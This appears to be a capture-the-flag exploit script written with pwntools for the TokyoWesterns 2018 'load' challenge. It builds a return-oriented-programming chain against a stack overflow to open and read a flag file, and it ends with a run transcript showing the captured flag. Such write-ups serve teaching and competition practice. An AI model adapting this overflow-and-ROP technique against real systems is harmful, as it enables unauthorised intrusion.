#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./load-ef05273401f331748cca5fcb8b14c43f80600adf4266fee4e5f250730b503f0c"
libcPath = ""
remoteAddr = "pwn1.chal.ctf.westerns.tokyo"
remotePort = 34835

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def common_gadgets(func, rdx, rsi, edi):
    return flat(0x400A6A, 0, 1, func, rdx, rsi, edi, 0x400A50, cyclic(56))

if __name__ == "__main__":
    name = "/proc/self/fd/0".ljust(0x10, '\0')
    name += "/dev/pts/0".ljust(0x10, '\0')
    name += "/home/load/flag.txt".ljust(0x20, '\0')
    #  name += "/dev/pts/1".ljust(0x10, '\0')
    #  name += "./flag.txt".ljust(0x20, '\0')
    io.sendlineafter("name: ", name)
    io.sendlineafter("offset: ", "0")
    io.sendlineafter("size:", str(0x400))

    filename = 0x601040
    prdi = 0x0000000000400a73 
    pprsi = 0x0000000000400a71 
    rop = cyclic(0x30 + 8)
    rop += flat(prdi, filename + 0x10, pprsi, 2, 0, elf.plt['open']) # open("/dev/pts/1", 2) -> 0
    rop += flat(prdi, filename + 0x10, pprsi, 2, 0, elf.plt['open']) # open("/dev/pts/1", 2) -> 1
    rop += flat(prdi, filename + 0x20, pprsi, 0, 0, elf.plt['open']) # open("flag", 0) -> 2
    rop += common_gadgets(elf.got['read'], 0x100, filename + 0x50, 2) # read(2, filename + 0x50, 0x100)
    rop += flat(prdi, filename + 0x50, elf.plt['puts'])

    #  DEBUG([0x4008A8, 0x400A6A])
    assert len(rop) <= 0x400
    io.sendline(rop)
    
    io.interactive()
    '''
    TokyoWesterns2018_load [master●●] python exp.py r
    [*] '/home/m4x/pwn_repo/TokyoWesterns2018_load/load-ef05273401f331748cca5fcb8b14c43f80600adf4266fee4e5f250730b503f0c'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        FORTIFY:  Enabled
    [+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 34835: Done
    [*] Switching to interactive mode
     Load file complete!
    TWCTF{pr0cf5_15_h1ghly_fl3x1bl3}
    
    [*] Got EOF while reading in interactive
    '''
